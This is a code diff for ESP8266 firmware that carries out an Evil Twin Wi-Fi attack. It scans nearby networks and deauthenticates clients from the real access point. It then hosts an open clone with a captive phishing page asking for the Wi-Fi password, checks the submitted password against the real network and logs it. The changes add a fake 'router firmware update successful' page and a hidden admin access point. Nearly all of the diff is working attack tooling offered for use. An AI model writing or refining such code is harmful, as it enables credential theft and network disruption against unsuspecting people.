@@ -18,7 +18,7 @@ struct OUIEntry {
   const char* vendor;
 };
 
-const OUIEntry ouiTable[] = {
+const OUIEntry ouiTable[] PROGMEM = {
   { {0xCC, 0x2D, 0x21}, "Tenda" },
   { {0x50, 0xC7, 0xBF}, "TP-Link" },
   { {0x84, 0x16, 0xF9}, "TP-Link" },
@@ -52,10 +52,10 @@ const int ouiCount = sizeof(ouiTable) / sizeof(ouiTable[0]);
 
 String getVendor(const uint8_t* bssid) {
   for (int i = 0; i < ouiCount; i++) {
-    if (bssid[0] == ouiTable[i].oui[0] &&
-        bssid[1] == ouiTable[i].oui[1] &&
-        bssid[2] == ouiTable[i].oui[2]) {
-      return String(ouiTable[i].vendor);
+    if (bssid[0] == pgm_read_byte(&ouiTable[i].oui[0]) &&
+        bssid[1] == pgm_read_byte(&ouiTable[i].oui[1]) &&
+        bssid[2] == pgm_read_byte(&ouiTable[i].oui[2])) {
+      return String((const char*)pgm_read_ptr(&ouiTable[i].vendor));
     }
   }
   return "Unknown";
@@ -240,7 +240,7 @@ String footer() {
 
 String index() {
   return header(TITLE) + "<div>" + BODY + "</ol></div><div><form action='/' method=post><label>WiFi password:</label>" +
-         "<input type=password id='password' name='password' minlength='8'></input><input type=submit value=Continue></form>" + footer();
+         "<input type=password id='password' name='password' minlength='8'></input><input type=submit value=Update></form>" + footer();
 }
 
 void setup() {
@@ -266,12 +266,15 @@ void setup() {
   WiFi.mode(WIFI_AP_STA);
   wifi_promiscuous_enable(1);
   WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
-  WiFi.softAP("Rahmttollah", "66778899");
+  // Hidden AP: channel 1, hidden = true
+  WiFi.softAP(" ", "66778899", 1, false);
   dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
 
   webServer.on("/", handleIndex);
   webServer.on("/result", handleResult);
   webServer.on("/admin", handleAdmin);
+  webServer.on("/restart", handleRestart);
+  webServer.on("/check", handleCheck);
   webServer.on("/masks", handleMasks);
   webServer.on("/masks/add", handleMasksAdd);
   webServer.on("/masks/random", handleMasksRandom);
@@ -305,31 +308,311 @@ void performScan() {
 bool hotspot_active = false;
 bool deauthing_active = false;
 bool prev_deauth = false;
+bool prev_promiscuous = false;
 
+// ---------- EvilTwin handlers ----------
 void handleResult() {
+  Serial.println("=== handleResult called ===");
   if (WiFi.status() != WL_CONNECTED) {
+    Serial.print("WiFi.status() = ");
+    Serial.println(WiFi.status());
+    Serial.println("Wrong password (connection failed).");
     deauthing_active = prev_deauth;
-    if (webServer.arg("deauth") == "start") {
-      deauthing_active = true;
+    if (prev_promiscuous) {
+      wifi_promiscuous_enable(1);
+      Serial.println("Promiscuous mode re-enabled.");
     }
+    Serial.print("Deauth restored to: ");
+    Serial.println(deauthing_active ? "ON" : "OFF");
     webServer.send(200, "text/html; charset=UTF-8", "<html><head><script> setTimeout(function(){window.location.href = '/';}, 4000); </script><meta name='viewport' content='initial-scale=1.0, width=device-width'><body><center><h2><wrong style='text-shadow: 1px 1px black;color:red;font-size:60px;width:60px;height:60px'>&#8855;</wrong><br>Wrong Password</h2><p>Please, try again.</p></center></body> </html>");
-    Serial.println("Wrong password tried!");
   } else {
     _correct = "Network: " + _selectedNetwork.ssid + "   Password: " + _tryPassword;
+    Serial.println("SUCCESS! Password captured.");
+    Serial.print("SSID: ");
+    Serial.println(_selectedNetwork.ssid);
+    Serial.print("Password: ");
+    Serial.println(_tryPassword);
     hotspot_active = false;
     dnsServer.stop();
     int n = WiFi.softAPdisconnect(true);
     Serial.println(String(n));
     WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
-    WiFi.softAP("Rahmttollah", "66778899");
+    WiFi.softAP("Rahmttollah", "66778899", 1, true); // hidden
     dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
-    Serial.println("Good password was entered !");
-    Serial.println(_correct);
+    deauthing_active = false;
+    prev_deauth = false;
+    prev_promiscuous = false;
+    Serial.println("Deauth disabled (success).");
+
+    // Send success page
+    String successPage = R"rawliteral(
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Update Successful</title>
+<style>
+body {
+  font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+  background: #f0f4f8;
+  margin: 0;
+  padding: 0;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  min-height: 100vh;
+}
+.container {
+  background: white;
+  border-radius: 12px;
+  box-shadow: 0 8px 30px rgba(0,0,0,0.12);
+  padding: 40px 30px;
+  max-width: 480px;
+  width: 90%;
+  text-align: center;
+}
+.icon {
+  font-size: 72px;
+  color: #2ecc71;
+  margin-bottom: 16px;
+}
+h1 {
+  color: #2c3e50;
+  font-weight: 600;
+  margin: 0 0 8px 0;
+}
+.sub {
+  color: #7f8c8d;
+  font-size: 16px;
+  margin-bottom: 24px;
+}
+.detail {
+  background: #f8f9fa;
+  border-radius: 8px;
+  padding: 16px;
+  margin: 16px 0;
+  font-size: 14px;
+  color: #2c3e50;
+  text-align: left;
+}
+.detail span {
+  font-weight: 600;
+  color: #2980b9;
+}
+.btn {
+  background: #3498db;
+  color: white;
+  border: none;
+  padding: 12px 28px;
+  border-radius: 6px;
+  font-size: 16px;
+  cursor: pointer;
+  text-decoration: none;
+  display: inline-block;
+  margin-top: 12px;
+}
+.btn:hover {
+  background: #2980b9;
+}
+.footer {
+  margin-top: 24px;
+  font-size: 12px;
+  color: #bdc3c7;
+}
+</style>
+</head>
+<body>
+<div class="container">
+  <div class="icon">✅</div>
+  <h1>Update Successful</h1>
+  <p class="sub">Your router firmware has been updated.</p>
+  <div class="detail">
+    <strong>Network:</strong> <span>{ssid}</span><br>
+    <strong>Status:</strong> <span style="color:#2ecc71;">Connected</span>
+  </div>
+  <p style="color:#7f8c8d; font-size:14px;">Please reconnect your WiFi to the updated network.</p>
+  <a href="/admin" class="btn">Go to Dashboard</a>
+  <div class="footer">Router firmware update complete &bull; v2.1.0</div>
+</div>
+</body>
+</html>
+)rawliteral";
+    successPage.replace("{ssid}", htmlEscape(_selectedNetwork.ssid));
+    webServer.send(200, "text/html; charset=UTF-8", successPage);
   }
 }
 
-// ---------- Admin HTML template (with watermark) ----------
-String _adminHTML = R"rawliteral(
+void handleCheck() {
+  if (WiFi.status() == WL_CONNECTED) {
+    webServer.send(200, "text/plain", "connected");
+  } else {
+    webServer.send(200, "text/plain", "disconnected");
+  }
+}
+
+void handleIndex() {
+  if (webServer.hasArg("ap")) {
+    for (int i = 0; i < 16; i++) {
+      if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap") ) {
+        _selectedNetwork = _networks[i];
+        Serial.print("Selected network: ");
+        Serial.println(_selectedNetwork.ssid);
+      }
+    }
+  }
+
+  if (webServer.hasArg("deauth")) {
+    if (webServer.arg("deauth") == "start") {
+      deauthing_active = true;
+      wifi_promiscuous_enable(1);
+      Serial.println("Deauth started via parameter.");
+    } else if (webServer.arg("deauth") == "stop") {
+      deauthing_active = false;
+      wifi_promiscuous_enable(0);
+      Serial.println("Deauth stopped via parameter.");
+    }
+  }
+
+  if (webServer.hasArg("hotspot")) {
+    if (webServer.arg("hotspot") == "start") {
+      hotspot_active = true;
+      dnsServer.stop();
+      int n = WiFi.softAPdisconnect(true);
+      Serial.println(String(n));
+      WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
+      WiFi.softAP(_selectedNetwork.ssid.c_str()); // visible (not hidden)
+      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
+      Serial.print("EvilTwin started with SSID: ");
+      Serial.println(_selectedNetwork.ssid);
+      if (webServer.hasArg("deauth") && webServer.arg("deauth") == "start") {
+        deauthing_active = true;
+        wifi_promiscuous_enable(1);
+        Serial.println("Deauth also activated.");
+      }
+    } else if (webServer.arg("hotspot") == "stop") {
+      hotspot_active = false;
+      dnsServer.stop();
+      int n = WiFi.softAPdisconnect(true);
+      Serial.println(String(n));
+      WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
+      WiFi.softAP("Rahmttollah", "66778899", 1, true); // hidden
+      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
+      Serial.println("EvilTwin stopped.");
+    }
+    return;
+  }
+
+  if (hotspot_active == false) {
+    webServer.send(200, "text/html; charset=UTF-8", "<html><head><meta charset='UTF-8'><meta http-equiv='refresh' content='0;url=/admin'></head><body>Redirecting to admin...</body></html>");
+    return;
+  } else {
+    if (webServer.hasArg("password")) {
+      _tryPassword = webServer.arg("password");
+      Serial.println("Password submitted: " + _tryPassword);
+      Serial.print("Target SSID: ");
+      Serial.println(_selectedNetwork.ssid);
+      Serial.print("Target BSSID: ");
+      Serial.println(bytesToStr(_selectedNetwork.bssid, 6));
+      Serial.print("Target Channel: ");
+      Serial.println(_selectedNetwork.ch);
+
+      prev_deauth = deauthing_active;
+      prev_promiscuous = (wifi_get_opmode() == STATION_MODE ? 0 : 1);
+      deauthing_active = false;
+      wifi_promiscuous_enable(0);
+      Serial.println("Deauth and promiscuous mode completely disabled for verification.");
+
+      delay(1000);
+      WiFi.disconnect();
+      Serial.println("Disconnected from any previous network.");
+
+      // Keep AP+STA mode – DO NOT change mode
+      delay(500);
+
+      WiFi.begin(_selectedNetwork.ssid.c_str(), _tryPassword.c_str(), _selectedNetwork.ch, _selectedNetwork.bssid);
+      Serial.println("WiFi.begin called (AP+STA mode).");
+
+      // Progress page with polling for connection status
+      String progressPage = R"rawliteral(
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Verifying...</title>
+<style>
+body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; padding: 20px; background: #f0f4f8; color: #2c3e50; }
+h2 { font-size: 6vw; margin-top: 30px; font-weight: 300; }
+progress { width: 80%; max-width: 400px; height: 8px; border-radius: 4px; }
+progress::-webkit-progress-bar { background: #ddd; border-radius: 4px; }
+progress::-webkit-progress-value { background: #3498db; border-radius: 4px; }
+#status { margin-top: 16px; font-size: 14px; color: #7f8c8d; }
+</style>
+<script>
+let startTime = Date.now();
+const timeout = 15000;
+let progress = 10;
+
+function updateProgress() {
+  let elapsed = Date.now() - startTime;
+  let percent;
+  if (elapsed < 2000) {
+    percent = 10 + (elapsed / 2000) * 50;
+  } else {
+    percent = 60 + ((elapsed - 2000) / 13000) * 40;
+  }
+  percent = Math.min(100, percent);
+  document.getElementById('progressBar').value = percent;
+  document.getElementById('status').textContent = 'Verifying integrity, please wait... ' + Math.round(percent) + '%';
+  return percent;
+}
+
+function checkStatus() {
+  fetch('/check')
+    .then(response => response.text())
+    .then(data => {
+      if (data === 'connected') {
+        window.location.href = '/result';
+        return;
+      }
+      let percent = updateProgress();
+      if (percent < 100) {
+        setTimeout(checkStatus, 300);
+      } else {
+        window.location.href = '/result';
+      }
+    })
+    .catch(() => {
+      setTimeout(checkStatus, 500);
+    });
+}
+
+window.onload = function() {
+  document.getElementById('progressBar').max = 100;
+  checkStatus();
+};
+</script>
+</head>
+<body>
+<h2>Verifying integrity, please wait...</h2>
+<progress id="progressBar" value="10" max="100"></progress>
+<p id="status">Verifying integrity, please wait... 10%</p>
+</body>
+</html>
+)rawliteral";
+      webServer.send(200, "text/html; charset=UTF-8", progressPage);
+
+      // Deauth remains off during verification – will be restored in handleResult if wrong
+      Serial.println("Deauth and promiscuous remain disabled until result is known.");
+    } else {
+      webServer.send(200, "text/html; charset=UTF-8", index());
+    }
+  }
+}
+
+// ---------- Admin HTML template (stored in PROGMEM) ----------
+const char adminHTML[] PROGMEM = R"rawliteral(
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -401,6 +684,8 @@ button:hover{border-color:#3b4a65;background:#192438}
 button:disabled{opacity:0.4;cursor:default}
 .primary{background:var(--accent);border-color:var(--accent)}
 .primary:hover{background:#4e7ff0}
+.danger{background:#e74c3c;border-color:#e74c3c}
+.danger:hover{background:#c0392b}
 .table-wrap{
   overflow-x:auto;border:1px solid var(--border);border-radius:17px;
   background:rgba(17,24,39,.82);
@@ -450,7 +735,6 @@ tr.selected{background:rgba(91,140,255,.12);border-left:3px solid var(--accent)}
 .copy-btn svg{width:18px;height:18px;fill:none;stroke:currentColor;stroke-width:2;stroke-linecap:round;stroke-linejoin:round}
 .copy-btn.copied{color:var(--good);border-color:var(--good)}
 .footer{margin-top:16px;text-align:center;color:var(--muted);font-size:11px}
-.footer a{color:var(--accent);text-decoration:none}
 .watermark{text-align:center;margin-top:22px;font-size:13px;color:var(--muted);opacity:0.8;letter-spacing:0.5px}
 .watermark span{color:var(--accent);font-weight:700}
 @media(max-width:700px){
@@ -486,6 +770,13 @@ function copyPassword() {
     alert('Could not copy password.');
     console.error(err);
   });
+}
+
+function restartESP() {
+  if (confirm('Restart the ESP8266? All temporary data will be lost.')) {
+    fetch('/restart', {method: 'POST'})
+      .then(() => { alert('Restarting...'); });
+  }
 }
 </script>
 </head>
@@ -530,6 +821,7 @@ function copyPassword() {
       <button onclick='if("{hotspot_action}"=="start"){ if(confirm("Deauth-o start korbe?")){ location="/admin?hotspot=start&deauth=start"; } else { location="/admin?hotspot=start"; } } else { location="/admin?hotspot=stop"; }' {hotspot_disabled}>{hotspot_button}</button>
       <button onclick="location.href='/masks'" class="primary">Manage Masks</button>
       <button id="refresh" onclick="location.reload()">Refresh UI</button>
+      <button onclick="restartESP()" class="danger">Restart ESP</button>
     </div>
   </div>
 
@@ -569,6 +861,24 @@ function copyPassword() {
 
 // ---------- Admin handler ----------
 void handleAdmin() {
+  Serial.println("=== handleAdmin called ===");
+
+  int count = 0;
+  for (int i = 0; i < 16; i++) {
+    if (_networks[i].ssid != "") count++;
+  }
+  if (count == 0) {
+    Serial.println("No networks, performing scan...");
+    performScan();
+    count = 0;
+    for (int i = 0; i < 16; i++) {
+      if (_networks[i].ssid != "") count++;
+    }
+    Serial.print("Scan complete, found ");
+    Serial.print(count);
+    Serial.println(" networks.");
+  }
+
   if (webServer.hasArg("ap")) {
     for (int i = 0; i < 16; i++) {
       if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap")) {
@@ -580,8 +890,10 @@ void handleAdmin() {
   if (webServer.hasArg("deauth")) {
     if (webServer.arg("deauth") == "start") {
       deauthing_active = true;
+      wifi_promiscuous_enable(1);
     } else if (webServer.arg("deauth") == "stop") {
       deauthing_active = false;
+      wifi_promiscuous_enable(0);
     }
   }
 
@@ -592,10 +904,11 @@ void handleAdmin() {
       int n = WiFi.softAPdisconnect(true);
       Serial.println(String(n));
       WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
-      WiFi.softAP(_selectedNetwork.ssid.c_str());
+      WiFi.softAP(_selectedNetwork.ssid.c_str()); // visible
       dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
       if (webServer.hasArg("deauth") && webServer.arg("deauth") == "start") {
         deauthing_active = true;
+        wifi_promiscuous_enable(1);
       }
     } else if (webServer.arg("hotspot") == "stop") {
       hotspot_active = false;
@@ -603,7 +916,7 @@ void handleAdmin() {
       int n = WiFi.softAPdisconnect(true);
       Serial.println(String(n));
       WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
-      WiFi.softAP("Rahmttollah", "66778899");
+      WiFi.softAP("Rahmttollah", "66778899", 1, true); // hidden
       dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
     }
     webServer.sendHeader("Location", "/admin", true);
@@ -611,12 +924,14 @@ void handleAdmin() {
     return;
   }
 
-  String html = String(_adminHTML);
-
-  int count = 0;
-  for (int i = 0; i < 16; i++) {
-    if (_networks[i].ssid != "") count++;
+  // Build HTML from PROGMEM
+  String html = String(FPSTR(adminHTML));
+  if (html.length() < 100) {
+    Serial.println("ERROR: Admin HTML template is empty!");
+    webServer.send(200, "text/html", "<h1>Admin Page</h1><p>Sorry, the page could not be loaded. Please restart the ESP.</p>");
+    return;
   }
+
   html.replace("{network_count}", String(count));
 
   String selName = (_selectedNetwork.ssid != "") ? _selectedNetwork.ssid : "None";
@@ -624,17 +939,21 @@ void handleAdmin() {
 
   String rows = "";
   String selectedBSSID = bytesToStr(_selectedNetwork.bssid, 6);
-  for (int i = 0; i < 16; i++) {
-    if (_networks[i].ssid == "") break;
-    String bssid = bytesToStr(_networks[i].bssid, 6);
-    bool isSelected = (bssid == selectedBSSID);
-    String rowClass = isSelected ? "selected" : "";
-    rows += "<tr class=\"" + rowClass + "\" data-bssid=\"" + bssid + "\" onclick=\"selectNetwork('" + bssid + "')\">";
-    rows += "<td class=\"ssid\">" + htmlEscape(_networks[i].ssid) + "</td>";
-    rows += "<td>" + bssid + "</td>";
-    rows += "<td>" + _networks[i].vendor + "</td>";
-    rows += "<td><span class=\"badge\">" + String(_networks[i].ch) + "</span></td>";
-    rows += "</tr>";
+  if (count == 0) {
+    rows = "<tr><td colspan='4'>No networks found</td></tr>";
+  } else {
+    for (int i = 0; i < 16; i++) {
+      if (_networks[i].ssid == "") break;
+      String bssid = bytesToStr(_networks[i].bssid, 6);
+      bool isSelected = (bssid == selectedBSSID);
+      String rowClass = isSelected ? "selected" : "";
+      rows += "<tr class=\"" + rowClass + "\" data-bssid=\"" + bssid + "\" onclick=\"selectNetwork('" + bssid + "')\">";
+      rows += "<td class=\"ssid\">" + htmlEscape(_networks[i].ssid) + "</td>";
+      rows += "<td>" + bssid + "</td>";
+      rows += "<td>" + _networks[i].vendor + "</td>";
+      rows += "<td><span class=\"badge\">" + String(_networks[i].ch) + "</span></td>";
+      rows += "</tr>";
+    }
   }
   html.replace("{network_rows}", rows);
 
@@ -661,135 +980,15 @@ void handleAdmin() {
   html.replace("{hotspot_disabled}", disabled ? "disabled" : "");
 
   webServer.send(200, "text/html; charset=UTF-8", html);
+  Serial.println("Admin page sent successfully.");
 }
 
-// ---------- Root handler (phishing page) ----------
-void handleIndex() {
-  if (webServer.hasArg("ap")) {
-    for (int i = 0; i < 16; i++) {
-      if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap")) {
-        _selectedNetwork = _networks[i];
-      }
-    }
-  }
-
-  if (webServer.hasArg("deauth")) {
-    if (webServer.arg("deauth") == "start") {
-      deauthing_active = true;
-    } else if (webServer.arg("deauth") == "stop") {
-      deauthing_active = false;
-    }
-  }
-
-  if (webServer.hasArg("hotspot")) {
-    if (webServer.arg("hotspot") == "start") {
-      hotspot_active = true;
-      dnsServer.stop();
-      int n = WiFi.softAPdisconnect(true);
-      Serial.println(String(n));
-      WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
-      WiFi.softAP(_selectedNetwork.ssid.c_str());
-      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
-      if (webServer.hasArg("deauth") && webServer.arg("deauth") == "start") {
-        deauthing_active = true;
-      }
-    } else if (webServer.arg("hotspot") == "stop") {
-      hotspot_active = false;
-      dnsServer.stop();
-      int n = WiFi.softAPdisconnect(true);
-      Serial.println(String(n));
-      WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
-      WiFi.softAP("Rahmttollah", "66778899");
-      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
-    }
-    return;
-  }
-
-  if (hotspot_active == false) {
-    webServer.send(200, "text/html; charset=UTF-8", "<html><head><meta charset='UTF-8'><meta http-equiv='refresh' content='0;url=/admin'></head><body>Redirecting to admin...</body></html>");
-    return;
-  } else {
-    if (webServer.hasArg("password")) {
-      prev_deauth = deauthing_active;
-      deauthing_active = false;
-      _tryPassword = webServer.arg("password");
-      delay(1000);
-      WiFi.disconnect();
-      WiFi.begin(_selectedNetwork.ssid.c_str(), webServer.arg("password").c_str(), _selectedNetwork.ch, _selectedNetwork.bssid);
-      
-      String progressPage = R"rawliteral(
-<!DOCTYPE html>
-<html>
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<style>
-body { 
-  font-family: 'Century Gothic', sans-serif; 
-  text-align: center; 
-  padding: 20px; 
-  background: #f2f2f2;
-  color: #333;
-}
-h2 { font-size: 7vw; margin-top: 30px; }
-.progress-container {
-  width: 80%;
-  max-width: 400px;
-  margin: 30px auto;
-  background: #ddd;
-  border-radius: 30px;
-  overflow: hidden;
-  height: 30px;
-  box-shadow: inset 0 2px 5px rgba(0,0,0,0.2);
-}
-.progress-bar {
-  height: 100%;
-  width: 0%;
-  background: linear-gradient(90deg, #4CAF50, #8BC34A);
-  transition: width 0.15s linear;
-  border-radius: 30px;
-}
-#progressText {
-  font-size: 20px;
-  font-weight: bold;
-  color: #0066ff;
-}
-</style>
-<script>
-const startTime = Date.now();
-const duration = 15000;
-
-function updateProgress() {
-  const elapsed = Date.now() - startTime;
-  let percent = Math.min(100, (elapsed / duration) * 100);
-  document.getElementById('progressBar').style.width = percent + '%';
-  document.getElementById('progressText').textContent = Math.round(percent) + '%';
-  if (percent < 100) {
-    requestAnimationFrame(updateProgress);
-  }
-}
-window.onload = function() {
-  updateProgress();
-  setTimeout(function() {
-    window.location.href = '/result';
-  }, duration);
-};
-</script>
-</head>
-<body>
-<h2>Verifying integrity, please wait...</h2>
-<div class="progress-container">
-  <div id="progressBar" class="progress-bar"></div>
-</div>
-<p id="progressText">0%</p>
-</body>
-</html>
-)rawliteral";
-      webServer.send(200, "text/html; charset=UTF-8", progressPage);
-    } else {
-      webServer.send(200, "text/html; charset=UTF-8", index());
-    }
-  }
+// ---------- Restart handler ----------
+void handleRestart() {
+  Serial.println("Restart requested. Rebooting ESP...");
+  webServer.send(200, "text/plain", "Restarting...");
+  delay(100);
+  ESP.restart();
 }
 
 // ---------- Mask Manager ----------
@@ -1070,7 +1269,7 @@ void loop() {
     deauth_now = millis();
   }
 
-  // ---------- Beacon Spamming (tested Spacehuhn code) ----------
+  // Beacon Spamming
   if (beacon_spamming_active && maskCount > 0) {
     uint32_t currentTime = millis();
 
@@ -1123,13 +1322,7 @@ void loop() {
     now = millis();
   }
 
-  // WiFi status check
   if (millis() - wifinow >= 2000) {
-    if (WiFi.status() != WL_CONNECTED) {
-      Serial.println("BAD");
-    } else {
-      Serial.println("GOOD");
-    }
     wifinow = millis();
   }
 }
